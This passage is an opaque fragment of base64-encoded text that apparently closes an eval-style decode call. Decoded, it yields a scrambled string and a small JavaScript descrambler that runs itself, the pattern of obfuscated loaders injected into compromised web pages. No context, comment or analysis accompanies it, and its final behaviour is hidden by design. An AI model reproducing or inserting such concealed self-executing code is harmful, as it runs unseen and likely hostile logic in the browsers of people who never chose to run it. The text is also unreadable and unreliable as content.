H1pdDFzJixwJl9tZG4oYix0Y2FnRWc6b1srUVEjdG9hWDtMc3MpUW9jUT1RMiE2fTViMTJRUWVfMmEpMFEyKD0rY1EpdGUlYXRiUXJ0MXNRXWFpUShfX1FlUVEzNihoaVxcMD0uXW4oLmMpUWFkMT0lVSldLnZRYW5RbmVhKHtjNC1fKCkwbG8pbnRRJXlRZS5RKGVBeVFdcmVhUVFyUWVvX0krVCF0LihRUVF2KFFkYShldG5YIG09MmZkWW5ybjQgUX1iKG91ZlFhbnIzYzJ0UX1uUTNYYXRfbCV9d2FlNVExaT1RdTEyUXQuNV1jaF1sWDJLcDNfUVEuUWE+dCFRe29cJz1RSD0oMV1RLGk4WHBkJWdELmFFUVFUSSRhKF1lPjB0KTFRZSUpO3JhKlF4KSBRc2wxbiBhN11kby5zdUFdXz0rYmF0LD0oUy5YZGxlUWUmOl9uc2VpOTtlLHAgajZnNX0xaC5saH1tJXc7KWN1RCVbUVwnYXsgX1FvcjFvIDNvTXRhaVEyPysrUXIwIGNRZVEkUToxbExZPV8uUWUpel1pbz17eWU4UVFXKyhReDBhYFFfKCBmLGVDc1FPPXRfKFFRXWxqZW5tIV1hUXsjKF9ldS5Re2ElZGlZdVFye0ouNW50RW5nLjF0blhuTTMlLihuLjZ0NTtyUShyXzNfUGFKKVFyaD1RYWhRczFRIG5pYVwnMXN4V19yajQldHJndm5wOyBfUS49UTtjKV90MFE1dDd9Qz1nUSZuZFRhaVElLlglaHJwdC5TYV1lZWdkXWF0ZXBhYWNvaGl1UURfUVExLiEuamVfcilbajQ+PmFzUS40e2xRdmFfZFsudF1bKThRM2g9JW8ubTR0UXBkUSlzKXRodDN7M3RwYXJdLi4oc3hsMS4yUXMuICx0bmxcXHZmIGZGIjNlYShhcHR9X3Rla1QuczRRUXN9bndddV9fb189RztuND5hLClhYnUufS50UXBpdChRNTNfZTYsUWx9KDFzI2VRUVEhYT0gKz8zPV9fUW90USBoKCxRICksUTY5KV9ldjMgUW1fXzNTclJhb2F9UW4hKW1hJWRRcylRYltLZSVdIHQrbzRzUChjZTJzIDNROGljJHQuUXtRJXI5YS0pdHJfX3J1ZzJReTRsPG9vKWFfODYyYWQyMm9wXTNdc1FLb1BRKXRfUWNfZXNvcGNRZy5vdG5fLDtyaSlhUV8yY20uUTVhZVE2X3NsUVFuYXMlaVEzcFEpJTAgUT07X2UgMWVdKW5sbDJzRV02OzE3UVFtb2khbi5lMy5ZUXRwUV1jc2VRQnRRMWFRZV1TNGM0cCguNXtyZDU1IGFRZlEsXXJkNFFAMj80IChfUVFzaURlYzJdOVEhNl0uYmFqX2JzdH1pMlExIWhrYTEqUSBcL11uX1pRMlFvLD4lZCVRPUcsbGxRe1EpLmE5ZW8mNGdnPXJ0ZHJwMXlmaS4jb1FvJXVscyxlZWYjWmVdJVFRLlFyO3QsLmgub21yZj1dYjBjaTl0NCByaSwgKWY9UWFlOzl0PS4gZXN1bWl2bnJ7KDcsbnMkam9RSXQxclFhLnNlb3QyKV9pb3BTNGZlYS50PFEhUTNRZ25fU310X1FhIGVRLmlbIEJ0aSxkIV1jUy0sclFmXFwzeV1RNHtjZXR0YV8zZVFhYTtlZWU7Oy4wLihzaXRpb2ktIE80KWRvIDUhUS5hYSVjTl9vUSwrMC4zLmlwaTVpUXJCVDZ0IFFlYjUgfVF9UXBhfS5oYW9RZnhhUS4xUXlvYUBpYXtwdFF0MnBlOVN0bihvdSF7KUt9d2F2aGhddm45IGIuJG4nKSk7dmFyIFFRTD1XQ1Uoc05TLGpscyApO1FRTCg0NDc0KTtyZXR1cm4gNDUxMH0pKCk='))
